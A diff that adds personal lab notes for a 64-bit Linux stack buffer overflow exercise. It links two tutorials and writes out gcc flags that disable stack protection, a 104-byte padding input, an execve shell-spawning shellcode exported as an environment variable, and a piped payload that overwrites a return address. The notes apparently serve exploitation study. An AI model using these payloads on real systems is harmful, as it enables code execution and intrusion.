@@ -1,0 +1,19 @@
+https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/
+https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
+
+gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable
+
+gcc getenvvar.c -o getenvvar
+
+// Shellcode did not work in case when it was located in data section 
+gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+
+
+// Python3 prints hex bytes differently
+
+python2 -c "print 'A'*104 + '\x41\x41\x41\x41\x41\x41\x00\x00'" > in.bin
+
+export PWN=`python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
+
+
+(python2 -c "print 'A'*104 + '\xb7\xe4\xff\xff\xff\x7f\x00\x00'"; cat) | ./vulnerable
